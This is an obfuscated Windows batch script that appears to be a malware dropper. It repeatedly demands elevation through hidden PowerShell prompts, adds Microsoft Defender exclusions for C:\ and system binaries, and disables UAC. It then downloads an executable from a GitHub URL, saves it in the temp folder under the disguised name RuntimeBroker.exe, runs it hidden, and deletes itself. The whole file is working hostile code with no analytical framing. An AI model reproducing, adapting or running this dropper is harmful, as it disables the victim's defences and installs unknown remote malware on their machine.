@echo off & setlocal enableDelayedExpansion
set "eneXE=SESSION" & set "mONBS=>nul" & set "nOQo=2>&1" & set "yWy=NET"
%yWy% %eneXE% %mONBS% %nOQo%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "QoCs=foo" & set "XpKor=baz" & set "RLXLp=qux" & set "aOUR=bar" & rem XIE jCbWf RpeNPWx
set "scDxh=powershell -ExecutionPolicy Bypass -Command"
set "Ijp=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "NzD='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "AeEw='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!scDxh! "!Ijp! !NzD! !AeEw!" %mONBS% %nOQo%
set "tyQ=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "ADnU=-Name 'EnableLUA' -Value 0"
!scDxh! "!tyQ! !ADnU!" %mONBS% %nOQo%
set "agV=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!scDxh! "!agV!" %mONBS% %nOQo%
if !errorlevel! neq 0 (goto %a%)
set "iTBes=timeout /t" & !iTBes! 2 %mONBS% %nOQo%
set "Slpg=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "Fnrso=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "OjORv=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!scDxh! "!Slpg! !Fnrso! !OjORv!" %mONBS% %nOQo%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!iTBes! 1 %mONBS% %nOQo% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %mONBS% %nOQo%
del /f /q "%~f0" %mONBS% %nOQo%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %mONBS% %nOQo%
if !errorlevel! neq 0 (!iTBes! 3 %mONBS% %nOQo% & goto %b%)
exit /b
